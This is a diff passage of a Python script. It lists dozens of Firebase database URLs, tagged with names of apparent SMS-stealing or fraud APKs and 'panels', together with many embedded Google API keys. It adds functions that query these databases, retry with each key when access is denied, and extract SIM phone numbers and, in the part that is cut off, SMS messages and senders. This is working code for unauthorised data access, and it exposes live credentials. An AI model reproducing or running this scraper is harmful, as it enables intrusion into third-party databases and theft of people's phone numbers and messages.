'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://kashish-700f7-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAGUGYKDbUX1rFDhnk79dk3_XWIVxmXC-Y', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyCyjAOZ3D45nzWaBn9pzEkdBUVlbxhCfMQ', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://ridam-c7949-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://hack-boss-9de0f-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://anand-d7e61-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://farhan-565bc-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://jonny-9bb2a-default-rtdb.europe-west1.firebasedatabase.app', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://proooh-672e6-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'chudaaai 9.apk', "url": 'https://apna26-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": ['AIzaSyA6iuCQxsY5W8tw-Hu0MF3ey0j3RSniOV8', 'AIzaSyAat3Ojk0hzugcjR9uG_O5ecJMcnXKmIz4', 'AIzaSyAbxb1hqTPl0qen2PGmnERgW7to9YNsqS0', 'AIzaSyAk5-ghEad9u6MDFGKdi8OdkbWyS86vwco', 'AIzaSyAu4Gv_EqcU0vjCO5DBoVeSu13-2RXSR0I', 'AIzaSyBE-mHLcDav5Bn4CTaPso3F7HX4tTy4wqo', 'AIzaSyBI1mOXLc6tgq7sh8aVJ7hsMqrwGo7gNlM', 'AIzaSyBVry2e7mc2VESO6HlJKMha8pMzyeweQTA', 'AIzaSyBcKb88YDDd9ffoDsH5EhiAJVw_ygY12pY', 'AIzaSyBgLptlqk-59Uk1RU3LXvMO4DUl_I7oVRs', 'AIzaSyC2J3ise8JYGXnaqbB6smr7dICCx0WHd9c', 'AIzaSyC4N_f3Md8cbt8rs-hdE89jOJ6Sn2t8RqM', 'AIzaSyC8d6kfctG23R2z77IcifG-dTo0rxFeO7Q', 'AIzaSyC9bjJf7jfHocW1cWTlPxgB2pbAuQ6hUuM', 'AIzaSyCFYKfIP4K2ge1PRHBu25mF1jIYDDZijKo', 'AIzaSyCGwbXI_jW-8tC9LJSlH4Pz8EMvFZQwueE', 'AIzaSyCJTE56lh43HKsWD8AJAyBS3lPes83mK9o', 'AIzaSyCT-cJzwhUszwCCRhHHwhULL7_JcV_1NFQ', 'AIzaSyCZm2iYTn4_l4ltIntVXz4WfT4zsvAsEN0', 'AIzaSyCxB48ZZla6mufEbYDXUH2p8c6w0Gdi_jk', 'AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'ckkumar', "url": 'https://ck-kumar3-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'colana', "url": 'https://colana-84ce2-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'csforme', "url": 'https://csforme-dc64a-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'dark18907', "url": 'https://dark-18907-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": []},
+    {"tag": 'demon4', "url": 'https://demon-4-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'dhani', "url": 'https://dhani-aa151-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'fir-27c9e', "url": 'https://fir-27c9e-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'fir1', "url": 'https://fir-1fa16-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'fir408', "url": 'https://fir-408f9-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'fire8ad7', "url": 'https://fir-e8ad7-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'fires', "url": 'https://fires-847da-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'fixed AI RTO Admin 9 (1) (2).apk', "url": 'https://rto91-2b27f-default-rtdb.firebaseio.com', "keys": ['AIzaSyAgRUQgmgrRPIJohL5OTqc3tHg77bWtXcI']},
+    {"tag": 'gaandkiaand', "url": 'https://gaandkiaand-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'gggggg', "url": 'https://gggggg-979bd-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'goone', "url": 'https://go-one-1b6b2-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'hdhdhdh', "url": 'https://hdhdhdh-38ae0-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'hehe', "url": 'https://hehe-679dd-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'hopkhfg', "url": 'https://hopkhfg-9981a-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'imdum', "url": 'https://imdum-6e873-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'indus', "url": 'https://indus-1-cec4f-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'jamtara118', "url": 'https://jamtara118-7cd20-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'jamtara150', "url": 'https://jamtara150-62b22-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'kisi', "url": 'https://kisi-d6da8-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'maik31440', "url": 'https://maik-31440-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'mano99', "url": 'https://mano99-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'manuwa', "url": 'https://manuwa-bb70a-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'mayor', "url": 'https://mayor-6f08c-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'merawala', "url": 'https://mera-wala-71a5e-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'mmmm', "url": 'https://mmmm-f7678-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'modi ji_1.0.apk', "url": 'https://duuu-dc41d-default-rtdb.firebaseio.com', "keys": ['AIzaSyANb5diLzfmtbkPbZk-UwG-ot4JZhjScsA', 'AIzaSyDQ_21hdN7h87WsRF4qUOVfqWYgI28r374']},
+    {"tag": 'myabtar', "url": 'https://myabtar-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'newspreding', "url": 'https://newspreding-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'nyapanel.apk', "url": 'https://bossuun-default-rtdb.firebaseio.com', "keys": ['AIzaSyBfQobM5HmnK6khogyF4ytOX7E9N0e_lAQ', 'AIzaSyDbWz9viiCY6VnWHP0_-Wo6TWZwCwu7Meg']},
+    {"tag": 'painislv', "url": 'https://painislv-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'panel123628', "url": 'https://panel123628-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'panel2', "url": 'https://lalannew5-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'panel3', "url": 'https://ajna-20fc4-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'panelwala64', "url": 'https://panel-wala-v64-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pawankumar', "url": 'https://pawankumar92342038-8f702-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pehla-green', "url": 'https://pehla-panel-green-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pintu', "url": 'https://pintu-8921f-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'piryankakumari', "url": 'https://piryankakumari1212c-9f29e-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pk114', "url": 'https://pk114-6e828-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'please', "url": 'https://please-2b091-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pm-kisan-20', "url": 'https://pm-kisan-20-vgg-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pm-kisan-28', "url": 'https://pm-kisan-28ugg-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pmfg', "url": 'https://pmfg-ccccc-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pmkisan', "url": 'https://pm-kisan-01hfg-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pmnr1newad', "url": 'https://pmnr1newad-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pmsjdj', "url": 'https://pmsjdj-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pohn', "url": 'https://pohn-cd7ea-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'prof', "url": 'https://prof-b6a64-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'project3', "url": 'https://project3-13fff-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'pvn7', "url": 'https://pvn7-a873a-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'r62710898', "url": 'https://r62710898-39a8e-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'rahul-54fe9', "url": 'https://rahul-54fe9-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'rahul-6bf55', "url": 'https://rahul-6bf55-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'rahulgandhi', "url": 'https://rahulgandhi-d09ca-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'rajkumar', "url": 'https://raj-kumar-63492-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'rajkumar8822556644', "url": 'https://rajkumar8822556644-407f5-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'raki143aa', "url": 'https://raki143aa-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'randi-rona', "url": 'https://randi-rona-81876-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'rbl7', "url": 'https://rbl-7-e796b-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'risho', "url": 'https://risho-d4c66-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'rnd12', "url": 'https://rnd12-17508-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'runjun', "url": 'https://runjun-master-panel-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 's85138920', "url": 'https://s85138920-87594-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'sbiclient0', "url": 'https://sbiclient0-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": []},
+    {"tag": 'sep12', "url": 'https://sep12-aea6d-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'server2', "url": 'https://server-2-fb768-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'server97', "url": 'https://server-97e23-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'shhs', "url": 'https://shhs-8fe30-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'shootadminkitter', "url": 'https://shooot-admin-kitter-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'sirelech', "url": 'https://sirelech1-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'smsmms', "url": 'https://smsmms-3b08e-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'spy25', "url": 'https://spy-25-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'testing848', "url": 'https://testing-848ad-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'tillu2', "url": 'https://tillu-2-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'u40179853', "url": 'https://u40179853-987df-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'u67583339', "url": 'https://u67583339-bf0c1-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'ufff', "url": 'https://ufff-52c18-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'vdgdgd', "url": 'https://vdgdgd-80f1e-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'vibe', "url": 'https://vibe-d238e-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'virugoniya', "url": 'https://virugoniya-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'xc04', "url": 'https://xc04-52348-default-rtdb.firebaseio.com', "keys": []},
+    {"tag": 'xx Admin 047 (3).apk', "url": 'https://rto-47-b39f4-default-rtdb.firebaseio.com', "keys": ['AIzaSyB9qxDIqS7FCqB-jSpqTAw9ipdf9OzIpho']},
+    {"tag": 'yourfirebasio', "url": 'https://yourfirebasio-default-rtdb.asia-southeast1.firebasedatabase.app', "keys": []},
+    {"tag": 'yqhwy', "url": 'https://yqhwy-2fb47-default-rtdb.firebaseio.com', "keys": []},
+]
+
+
+def fb_get(url, path, keys=None, timeout=8):
+    """Firebase REST GET with optional auth-key fallback."""
+    try:
+        full = f"{url.rstrip('/')}/{path}.json"
+        r = requests.get(full, timeout=timeout)
+        if r.status_code == 200:
+            return r.json()
+        if r.status_code in (401, 403) and keys:
+            for k in keys:
+                r2 = requests.get(f"{full}?auth={k}", timeout=timeout)
+                if r2.status_code == 200:
+                    return r2.json()
+        return None
+    except Exception:
+        return None
+
+
+def _extract_nums(sim):
+    nums = []
+    if isinstance(sim, dict):
+        for key in ("sim1Number", "sim2Number", "numberSim1", "numberSim2",
+                    "mobNo", "phoneNumber", "phone", "mobile"):
+            v = re.sub(r"\D", "", str(sim.get(key, "")))
+            if len(v) >= 10:
+                nums.append(v[-10:])
+    elif isinstance(sim, list):
+        for item in sim:
+            v = re.sub(r"\D", "", str(item))
+            if len(v) >= 10:
+                nums.append(v[-10:])
+    return nums
+
+
+def fb_discover_numbers(panel):
+    """Return list of (device_id, number) pairs.
+
+    Tries two structures:
+      A) UJALA:  All_Users/simDetails  (keyed by device_id, holds SIM numbers)
+      B) OTP panel: numbers/available  (keyed/list of numbers; device_id == number)
+    """
+    url = panel["url"]
+    keys = panel.get("keys", [])
     out = []
-    if depth > 4 or value is None:
+    # Pattern A
+    sim_all = fb_get(url, "All_Users/simDetails", keys)
+    if isinstance(sim_all, dict):
+        for dev_id, sim in sim_all.items():
+            for n in set(_extract_nums(sim)):
+                out.append((dev_id, n))
+    if out:
         return out
-    if isinstance(value, dict):
-        body = (value.get("body") or value.get("message") or value.get("text")
-                or value.get("Body") or value.get("Message") or value.get("smsBody"))
-        sender = (value.get("from") or value.get("from_number") or value.get("sender")
-                  or value.get("address") or value.get("phone") or value.get("num")
